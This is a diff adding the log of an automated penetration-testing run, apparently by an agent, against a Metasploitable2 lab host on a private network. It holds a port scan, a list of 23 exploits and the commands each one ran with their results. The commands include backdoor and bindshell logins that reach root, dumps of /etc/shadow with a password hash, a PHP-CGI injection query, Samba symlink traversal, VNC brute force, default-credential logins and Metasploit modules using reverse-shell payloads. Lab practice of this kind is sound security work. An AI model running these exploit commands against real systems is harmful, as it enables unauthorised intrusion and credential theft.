@@ -1,0 +1,307 @@
+  LHOST: 192.168.136.143
+
+==================================================
+[SCAN] 192.168.136.137
+==================================================
+     21/tcp  ftp vsftpd 2.3.4
+     22/tcp  ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+     23/tcp  telnet Linux telnetd
+     25/tcp  smtp Postfix smtpd
+     53/tcp  domain ISC BIND 9.4.2
+     80/tcp  http Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+    111/tcp  rpcbind 
+    139/tcp  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+    445/tcp  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+    512/tcp  exec netkit-rsh rexecd
+    513/tcp  login OpenBSD or Solaris rlogind
+    514/tcp  tcpwrapped 
+   1099/tcp  java-rmi GNU Classpath grmiregistry
+   1524/tcp  bindshell Metasploitable root shell
+   2049/tcp  rpcbind 
+   2121/tcp  ftp ProFTPD 1.3.1
+   3306/tcp  mysql MySQL 5.0.51a-3ubuntu5
+   3632/tcp  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+   5432/tcp  postgresql PostgreSQL DB 8.3.0 - 8.3.7
+   5900/tcp  vnc VNC (protocol 3.3)
+   6000/tcp  X11 (access denied)
+   6667/tcp  irc UnrealIRCd
+   6697/tcp  irc UnrealIRCd
+   8009/tcp  ajp13 Apache Jserv (Protocol v1.3)
+   8180/tcp  http Apache Tomcat/Coyote JSP engine 1.1
+   8787/tcp  drb Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
+  41161/tcp  unknown 
+  46244/tcp  unknown 
+  52408/tcp  unknown 
+  56366/tcp  unknown 
+  30 ports, 32s
+
+  23 exploits:
+    vsftpd-backdoor      ftp vsftpd 2.3.4:21
+    ssh-default          ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0):22
+    ssh-brute            ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0):22
+    telnet-default       telnet Linux telnetd:23
+    smtp-enum            smtp Postfix smtpd:25
+    apache-dav           http Apache httpd 2.2.8 ((Ubuntu) DAV/2):80
+    php-cgi              http Apache httpd 2.2.8 ((Ubuntu) DAV/2):80
+    web-apps             http Apache httpd 2.2.8 ((Ubuntu) DAV/2):80
+    samba-usermap        netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP):139
+    samba-usermap-rce    netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP):139
+    samba-symlink        netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP):139
+    rlogin-rsh           exec netkit-rsh rexecd:512
+    java-rmi             java-rmi GNU Classpath grmiregistry:1099
+    bindshell-1524       bindshell Metasploitable root shell:1524
+    proftpd-modcopy      ftp ProFTPD 1.3.1:2121
+    mysql-default        mysql MySQL 5.0.51a-3ubuntu5:3306
+    distcc-verify        distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)):3632
+    postgres-default     postgresql PostgreSQL DB 8.3.0 - 8.3.7:5432
+    vnc-connect          vnc VNC (protocol 3.3):5900
+    vnc-brute            vnc VNC (protocol 3.3):5900
+    x11-verify           X11 (access denied):6000
+    unrealircd-backdoor  irc UnrealIRCd:6667
+    tomcat-manager       http Apache Tomcat/Coyote JSP engine 1.1:8180
+
+==================================================
+[EXPLOIT] 23 exploits
+==================================================
+
+  [1/23] vsftpd-backdoor (ftp vsftpd 2.3.4:21)
+    $ (echo 'USER test:)'; echo 'PASS test') | nc -w 5 192.168.136.137 21 >/dev/n...
+    -> uid=0(root) gid=0(root)
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:146
+    OK (8.4s)
+
+  [2/23] ssh-default (ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0):22)
+    $ which sshpass >/dev/null 2>&1 || apt-get install -y sshpass >/dev/null 2>&1...
+    FAIL (0.3s)
+
+  [3/23] ssh-brute (ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0):22)
+    $ printf 'msfadmin\nuser\nservice\npostgres\nklog\nsys\nroot\n' > /tmp/_ul.tx...
+    FAIL (0.6s)
+
+  [4/23] telnet-default (telnet Linux telnetd:23)
+    $ python3 -c "import sys,time,telnetlib;tn=telnetlib.Telnet('192.168.136.137'...
+    -> Last login: Sun Jun 21 18:36:29 EDT 2026 from 192.168.136.143 on pts/1
+Linux metasploitable 2.6.24-16-server #1 SMP Thu
+    OK (3.3s)
+
+  [5/23] smtp-enum (smtp Postfix smtpd:25)
+    $ smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t...
+    -> 192.168.136.137: sys exists
+192.168.136.137: sync exists
+192.168.136.137: syslog exists
+192.168.136.137: user exists
+192
+    OK (0.6s)
+
+  [6/23] apache-dav (http Apache httpd 2.2.8 ((Ubuntu) DAV/2):80)
+    $ curl -s http://192.168.136.137/ | head -20...
+    -> <html><head><title>Metasploitable2 - Linux</title></head><body>
+<pre>
+
+                _                  _       _ _   
+    $ nikto -h 192.168.136.137 -C all -maxtime 20 2>/dev/null | grep -i 'osvdb\|v...
+    -> + [999965] /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file 
+    OK (21.4s)
+
+  [7/23] php-cgi (http Apache httpd 2.2.8 ((Ubuntu) DAV/2):80)
+    $ curl -s http://192.168.136.137/phpinfo.php 2>/dev/null | grep -ioE 'PHP Ver...
+    -> PHP Version 5.2.4
+DOCUMENT_ROOT 
+DOCUMENT_ROOT"]
+    $ curl -s 'http://192.168.136.137/?-d+allow_url_include%3don+-d+auto_prepend_...
+    -> PCGI:uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    OK (0.7s)
+
+  [8/23] web-apps (http Apache httpd 2.2.8 ((Ubuntu) DAV/2):80)
+    $ for a in dvwa mutillidae phpMyAdmin tikiwiki twiki dav test phpinfo.php; do...
+    -> dvwa -> 302
+mutillidae -> 200
+phpMyAdmin -> 200
+tikiwiki -> 200
+twiki -> 200
+dav -> 200
+test -> 200
+phpinfo.php -> 200
+    $ curl -s -m 8 http://192.168.136.137/twiki/bin/view/Main/TWikiUsers 2>/dev/n...
+    -> TWiki
+TWiki
+    OK (0.9s)
+
+  [9/23] samba-usermap (netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP):139)
+    $ smbclient //192.168.136.137/tmp -N -c 'ls' 2>/dev/null...
+    -> Anonymous login successful
+  .                                   D        0  Sun Jun 21 20:31:50 2026
+  ..              
+    $ rpcclient -U '%' 192.168.136.137 -c 'enumdomusers' 2>/dev/null | head -10...
+    -> user:[games] rid:[0x3f2]
+user:[nobody] rid:[0x1f5]
+user:[bind] rid:[0x4ba]
+user:[proxy] rid:[0x402]
+user:[syslog] rid:[0
+    $ enum4linux -a 192.168.136.137 2>/dev/null | grep -i 'user\|share\|password'...
+    -> Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, n
+    OK (7.5s)
+
+  [10/23] samba-usermap-rce (netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP):139)
+    $ msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS 192.16...
+    -> [*] No payload configured, defaulting to cmd/unix/reverse_netcat
+RHOSTS => 192.168.136.137
+RPORT => 139
+PAYLOAD => cmd/u
+    FAIL (14.1s)
+
+  [11/23] samba-symlink (netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP):139)
+    $ msfconsole -q -x "use auxiliary/admin/smb/samba_symlink_traversal; set RHOS...
+    -> RHOSTS => 192.168.136.137
+SMBSHARE => tmp
+SMBTARGET => rootfs
+[*] Running module against 192.168.136.137
+[*] 192.168.136
+    $ smbclient //192.168.136.137/tmp -N -c 'cd rootfs; cd etc; get passwd /tmp/s...
+    -> getting file \rootfs\etc\passwd of size 1581 as /tmp/sym_passwd (15810000.0 KiloBytes/sec) (average inf KiloBytes/sec)
+A
+    OK (3.0s)
+
+  [12/23] rlogin-rsh (exec netkit-rsh rexecd:512)
+    $ rsh -l root 192.168.136.137 'id; cat /etc/shadow | head -3' 2>/dev/null...
+    -> uid=0(root) gid=0(root) groups=0(root)
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999
+    OK (0.3s)
+
+  [13/23] java-rmi (java-rmi GNU Classpath grmiregistry:1099)
+    $ nmap --script=rmi-vuln-classloader -p 1099 192.168.136.137 2>/dev/null | gr...
+    -> | rmi-vuln-classloader: 
+|   VULNERABLE:
+|   RMI registry default configuration remote code execution vulnerability
+|   
+    OK (1.5s)
+
+  [14/23] bindshell-1524 (bindshell Metasploitable root shell:1524)
+    $ echo 'id; cat /etc/shadow | head -3; uname -a' | nc -w 3 192.168.136.137 15...
+    -> root@metasploitable:/# uid=0(root) gid=0(root) groups=0(root)
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+    OK (6.5s)
+
+  [15/23] proftpd-modcopy (ftp ProFTPD 1.3.1:2121)
+    $ printf 'USER anonymous\r\nPASS anon@test.com\r\nSITE CPFR /etc/passwd\r\nSI...
+    -> 220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.136.137]
+331 Password required for anonymous
+530 Login incorrect.
+5
+    FAIL (0.2s)
+
+  [16/23] mysql-default (mysql MySQL 5.0.51a-3ubuntu5:3306)
+    $ mysql -h 192.168.136.137 -u root --skip-ssl --connect-timeout=3 -e 'select ...
+    -> version()
+5.0.51a-3ubuntu5
+user()
+root@192.168.136.143
+    $ mysql -h 192.168.136.137 -u root --skip-ssl --connect-timeout=3 -e 'select ...
+    -> load_file("/etc/shadow")
+NULL
+    OK (0.5s)
+
+  [17/23] distcc-verify (distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)):3632)
+    $ echo 'id' | distcc 192.168.136.137 sh 2>/dev/null...
+    $ nmap --script distcc-cve2004-2687 -p 3632 192.168.136.137 2>/dev/null | gre...
+    -> |   VULNERABLE:
+|     State: VULNERABLE (Exploitable)
+|       earlier. The vulnerability is the consequence of weak serv
+    OK (1.5s)
+
+  [18/23] postgres-default (postgresql PostgreSQL DB 8.3.0 - 8.3.7:5432)
+    $ PGPASSWORD=postgres psql -h 192.168.136.137 -U postgres -c 'select version(...
+    -> version                                            
+--------------------------------------------------------------------
+    $ PGPASSWORD=postgres psql -h 192.168.136.137 -U postgres -c 'select pg_read_...
+    OK (0.6s)
+
+  [19/23] vnc-connect (vnc VNC (protocol 3.3):5900)
+    $ echo '' | nc -w 3 192.168.136.137 5900 | head -3...
+    -> RFB 003.003
+    OK (6.3s)
+
+  [20/23] vnc-brute (vnc VNC (protocol 3.3):5900)
+    $ hydra -p password -s 5900 -t 4 -f 192.168.136.137 vnc 2>&1 | grep -iE 'pass...
+    -> [5900][vnc] host: 192.168.136.137   password: password
+1 of 1 target successfully completed, 1 valid password found
+    OK (1.0s)
+
+  [21/23] x11-verify (X11 (access denied):6000)
+    $ xdpyinfo -display 192.168.136.137:0 2>/dev/null | head -10...
+    FAIL (0.2s)
+
+  [22/23] unrealircd-backdoor (irc UnrealIRCd:6667)
+    $ msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOST...
+    -> [*] Using configured payload cmd/linux/http/x86/meterpreter/reverse_tcp
+RHOSTS => 192.168.136.137
+RPORT => 6667
+PAYLOAD 
+    FAIL (16.0s)
+
+  [23/23] tomcat-manager (http Apache Tomcat/Coyote JSP engine 1.1:8180)
+    $ curl -s -u tomcat:tomcat http://192.168.136.137:8180/manager/html | grep -i...
+    -> <font size="+2">Tomcat Web Application Manager</font>
+  <td class="row-left"><a href="/manager/html/list">List Applicati
+    $ curl -s -u tomcat:tomcat http://192.168.136.137:8180/manager/html | grep -o...
+    OK (0.5s)
+
+==================================================
+[SKILLS]
+==================================================
+  vsftpd-backdoor: 成功 (8.4s)
+  ssh-default: 失败 (0.3s)
+  ssh-brute: 失败 (0.6s)
+  telnet-default: 成功 (3.3s)
+  smtp-enum: 成功 (0.6s)
+  apache-dav: 成功 (21.4s)
+  php-cgi: 成功 (0.7s)
+  web-apps: 成功 (0.9s)
+  samba-usermap: 成功 (7.5s)
+  samba-usermap-rce: 失败 (14.1s)
+  samba-symlink: 成功 (3.0s)
+  rlogin-rsh: 成功 (0.3s)
+  java-rmi: 成功 (1.5s)
+  bindshell-1524: 成功 (6.5s)
+  proftpd-modcopy: 失败 (0.2s)
+  mysql-default: 成功 (0.5s)
+  distcc-verify: 成功 (1.5s)
+  postgres-default: 成功 (0.6s)
+  vnc-connect: 成功 (6.3s)
+  vnc-brute: 成功 (1.0s)
+  x11-verify: 失败 (0.2s)
+  unrealircd-backdoor: 失败 (16.0s)
+  tomcat-manager: 成功 (0.5s)
+  Report: D:\agent\reports\pentest_174030.json
+
+==================================================
+  完成: 17/23 成功 | 135s | 30 端口
+==================================================
+  [OK] vsftpd-backdoor      8.4s
+  [FAIL] ssh-default          0.3s
+  [FAIL] ssh-brute            0.6s
+  [OK] telnet-default       3.3s
+  [OK] smtp-enum            0.6s
+  [OK] apache-dav           21.4s
+  [OK] php-cgi              0.7s
+  [OK] web-apps             0.9s
+  [OK] samba-usermap        7.5s
+  [FAIL] samba-usermap-rce    14.1s
+  [OK] samba-symlink        3.0s
+  [OK] rlogin-rsh           0.3s
+  [OK] java-rmi             1.5s
+  [OK] bindshell-1524       6.5s
+  [FAIL] proftpd-modcopy      0.2s
+  [OK] mysql-default        0.5s
+  [OK] distcc-verify        1.5s
+  [OK] postgres-default     0.6s
+  [OK] vnc-connect          6.3s
+  [OK] vnc-brute            1.0s
+  [FAIL] x11-verify           0.2s
+  [FAIL] unrealircd-backdoor  16.0s
+  [OK] tomcat-manager       0.5s
